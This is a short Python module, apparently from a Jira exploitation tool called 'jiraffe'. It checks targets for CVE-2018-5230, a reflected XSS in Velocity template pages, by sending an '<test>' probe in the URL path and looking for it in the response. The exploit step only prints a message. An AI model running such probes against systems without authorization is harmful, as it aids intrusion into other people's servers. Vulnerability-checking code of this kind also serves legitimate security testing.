#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
from jiraffe.exploits.base import Exploit
from jiraffe.enums import Severity


class CVE20185230(Exploit):
    cve = "CVE-2018-5230"
    severity = Severity.HIGH
    description = "Reflected XSS via Velocity template (.vm)"

    def check(self) -> bool:
        payload = "<test>"
        r = self.client.get(
            f"{self.target}/pages/{requests.utils.quote(payload)}.vm"
        )
        return r.status_code == 200 and payload in r.text

    def exploit(self) -> None:
        print("[*] Velocity template reflects user input (XSS possible)")
